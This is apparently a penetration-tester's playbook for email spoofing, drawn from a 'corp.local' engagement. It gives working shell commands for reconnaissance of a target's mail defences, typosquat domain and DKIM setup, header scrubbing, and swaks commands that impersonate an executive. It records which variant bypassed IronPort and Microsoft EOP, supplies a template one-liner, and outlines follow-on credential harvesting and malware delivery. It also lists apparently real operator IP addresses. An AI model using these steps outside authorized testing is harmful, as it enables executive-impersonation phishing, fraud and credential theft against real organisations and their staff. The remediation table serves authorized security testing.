# Email Spoofing Attack Chain

**Techniques:** DNS Recon → Typosquat Domain → DKIM Infrastructure → Display Name Spoof → Header Scrubbing  
**MITRE:** T1596.005 → T1583.001 → T1587.003 / T1583.004 → T1566 / T1036.005 / T1656 → T1027  
**Auth Required:** No  
**Tags:** #playbook #email #spoofing #phishing #initial-access

---

## Objective
Deliver a spoofed email impersonating a target organization executive into a recipient's inbox, bypassing enterprise email security controls (Cisco IronPort, Microsoft EOP, Anti_Spoof content filters).

---

## Prerequisites
- Domain registrar account (Cloudflare Registrar)
- Kali Linux VM with internet access on port 25
- Postfix + OpenDKIM + swaks installed
- Written authorization / SOW for the engagement
- Executive names and email format from OSINT (e.g., LinkedIn, email signature leaks)

---

## Step 1 — Recon: Assess Target Email Security Posture
*[[ttps/recon/email-security-dns-recon]] (T1596.005)*

```bash
DOMAIN="targetdomain.com"
dig +short MX $DOMAIN
dig +short TXT $DOMAIN | grep -i spf
dig +short TXT _dmarc.$DOMAIN
for sel in default google selector1 selector2 k1 mail; do
  result=$(dig +short TXT ${sel}._domainkey.$DOMAIN 2>/dev/null)
  [ -n "$result" ] && echo "[$sel]: $result"
done
```

**corp.local result (2026-03-08):**
- MX: Cisco IronPort (iphmx.com) — Talos SenderBase reputation, custom Anti_Spoof filters
- SPF: `-all` hardfail; includes `spf.protection.outlook.com` → M365 internal delivery confirmed
- DMARC: `p=none` → no enforcement; Proofpoint receiving reports
- DKIM: no selectors found

**Decision:** `p=none` opens header-from spoof. M365 internally means domain selection critical. Attempt Approach 2 first; fall back to Approach 1.

---

## Step 2 — Check Port 25 Reachability

```bash
MX=$(dig +short MX $DOMAIN | sort -n | head -1 | awk '{print $2}')
nc -zv $MX 25 2>&1
(echo "EHLO test"; sleep 2; echo "QUIT") | nc -w 10 $MX 25
```

**corp.local result:** Port 25 open. IronPort returned 220 banner and 250 EHLO response. Port 587 and 465 refused — IronPort accepts inbound on 25 only.

---

## Step 3 — Check Sending IP Reputation

```bash
IP=$(curl -s https://api.ipify.org)
REV=$(echo $IP | awk -F. '{print $4"."$3"."$2"."$1}')
dig +short $REV.zen.spamhaus.org   # 127.0.0.4 = PBL, 127.0.0.3 = SBL
dig +short -x $IP
```

**corp.local engagement:**
- Home IP `165.162.30.26` (Spectrum residential): on Spamhaus PBL/SBL/CSS but **neutral in Talos** — IronPort let it through
- ProtonVPN IP `159.26.99.31`: clean on Spamhaus but **blocked by Talos** — IronPort dropped connection
- Lesson: Spamhaus ≠ Talos. IronPort uses Talos. Test both.

---

## Step 4 — Register Typosquat Domain
*[[ttps/resource-development/typosquat-domain-acquisition]] (T1583.001)*

**Critical for M365 targets:** Avoid Microsoft product strings in domain name.

**corp.local engagement:**
- First attempt: `m365-verify.com` → EOP brand protection quarantined regardless of 8.9/10 auth score
- Solution: `target-portal.com` (one char off from `corp.local`) → bypassed all filters

---

## Step 5 — Generate DKIM Keypair
*[[ttps/resource-development/dkim-infrastructure-setup]] (T1587.003)*

```bash
mkdir -p ~/dkim && cd ~/dkim
openssl genrsa -out dkim-private.key 2048
openssl rsa -in dkim-private.key -pubout -out dkim-public.key
grep -v "^-----" dkim-public.key | tr -d '\n'   # → paste into DNS
```

---

## Step 6 — Configure DNS (Cloudflare)

```
TXT  @                  "v=spf1 ip4:<IP> -all"
TXT  mail._domainkey    "v=DKIM1; k=rsa; p=<pubkey>"
TXT  mail               "v=spf1 ip4:<IP> -all"
A    mail               <IP>
MX   @    10            mail.<domain>
```

All records: proxy = DNS only (grey cloud). Verify all 5 records on 3 resolvers before proceeding.

---

## Step 7 — Stand Up Postfix + OpenDKIM
*[[ttps/resource-development/dkim-infrastructure-setup]] + [[ttps/defense-evasion/smtp-header-scrubbing]]*

See full install/config in [[ttps/resource-development/dkim-infrastructure-setup]].

Key gotchas from corp.local engagement:
- Use `inet:localhost:12301` for milter — NOT `unix:` (Postfix chroot)
- Systemd override with `-f` flag required on Kali
- Wildcard signing table: `*    yourdomain.com` signs everything regardless of From domain
- Do not run `postmap` on header_checks

---

## Step 8 — Verify Stack

Send to mail-tester.com (NOT Gmail — residential IP hard-rejected by Google):

```bash
swaks -4 --to <mail-tester-address> --from support@your-domain.com \
  --server localhost --port 25 \
  --header "From: Test <support@your-domain.com>" \
  --header "Subject: Stack Test" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-domain.com>" \
  --header "Date: $(date -R)" \
  --body "DKIM stack verification"
```

**corp.local result:** 8.9/10 on mail-tester after adding HELO SPF record and MX record. Remaining deduction: residential PTR (unfixable without VPS).

Must confirm before proceeding:
- [ ] SPF: PASS
- [ ] DKIM: PASS + DKIM-Signature header present
- [ ] No kali/localhost/localdomain in headers
- [ ] HELO = mail.yourdomain.com
- [ ] No X-Mailer: swaks

---

## Step 9 — Attempt Header-From Spoof (Approach 2)
*[[ttps/initial-access/email-display-name-spoofing]] (T1566 / T1036.005 / T1656)*

Only if DMARC is `p=none`:

```bash
swaks -4 \
  --to target@victim.com \
  --from bounce@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: Executive Name <executive@victim.com>" \
  --header "Reply-To: executive@victim.com" \
  --header "Subject: Quick question" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@your-typosquat.com>" \
  --header "Date: $(date -R)" \
  --body "Body text"
```

**corp.local result:** Quarantined by IronPort's custom Anti_Spoof content filter (detected envelope/From mismatch). Document the quarantine alert — it's a finding (partial defense exists). Proceed to Step 10.

---

## Step 10 — Display Name Spoof (Approach 1)
*[[ttps/initial-access/email-display-name-spoofing]] (T1036.005 / T1656)*

```bash
swaks -4 \
  --to target@victim.com \
  --from executive@your-typosquat.com \
  --server localhost --port 25 \
  --header "From: CEO Name <executive@target-portal.com>" \
  --header "Reply-To: executive@target-portal.com" \
  --header "Subject: Quick question" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@target-portal.com>" \
  --header "Date: $(date -R)" \
  --body "Body text"
```

**corp.local result:** ✅ Delivered to inbox. Bypassed IronPort Anti_Spoof and M365 EOP. No domain mismatch = no filter trigger.

---

## Full One-Liner (Approach 1 — Display Name)
```bash
swaks -4 --to TARGET --from EXEC@TYPOSQUAT --server localhost --port 25 \
  --header "From: EXEC NAME, TITLE <EXEC@TYPOSQUAT>" \
  --header "Reply-To: EXEC@TYPOSQUAT" \
  --header "Subject: SUBJECT" \
  --header "Message-ID: <$(date +%s).$(shuf -i 1000-9999 -n1)@TYPOSQUAT>" \
  --header "Date: $(date -R)" \
  --body "BODY"
```

---

## Expected Output

**corp.local engagement findings:**
- Approach 2 (header-from): IronPort Anti_Spoof quarantine alert generated ← finding: detection exists
- Approach 1 (display name): Landed in inbox ← finding: detection gap, impersonation successful
- Both together: demonstrates partial controls with exploitable bypass

---

## Evidence to Capture
- [ ] Screenshot: IronPort/EOP Anti_Spoof quarantine alert (Approach 2) — shows detection
- [ ] Screenshot: Display name spoof in inbox (Approach 1) — shows bypass
- [ ] Screenshot: From field on mobile client showing only "CEO Name" — shows victim UX
- [ ] Raw headers of delivered mail — SPF/DKIM pass, clean headers, no operator fingerprint

---

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Header-from spoof delivers to inbox | Critical — DMARC p=none + no Anti_Spoof |
| Header-from quarantined, display name delivers | High — partial controls, bypassed via display name |
| Both blocked | Medium — controls working; social engineering still viable via lookalike domain |

---

## Relay / Attack Path
```
Display name spoof delivered to inbox
  → Pretext: wire transfer, credential reset, invoice approval, VPN token
  → Link: credential harvest page
  → Attachment: malware delivery
  → Reply: attacker receives response at Reply-To address
```

---

## Remediation

| Finding | Fix |
|---------|-----|
| DMARC `p=none` | Escalate to `p=quarantine` → `p=reject` after monitoring |
| Display name spoof delivered | Enable anti-impersonation in EOP: block external mail with internal display names |
| DKIM not configured | Implement DKIM signing on all outbound mail |
| No user awareness | Train users to verify sender address, not just display name |

---

## Related
- [[ttps/recon/email-security-dns-recon]]
- [[ttps/resource-development/typosquat-domain-acquisition]]
- [[ttps/resource-development/dkim-infrastructure-setup]]
- [[ttps/initial-access/email-display-name-spoofing]]
- [[ttps/defense-evasion/smtp-header-scrubbing]]
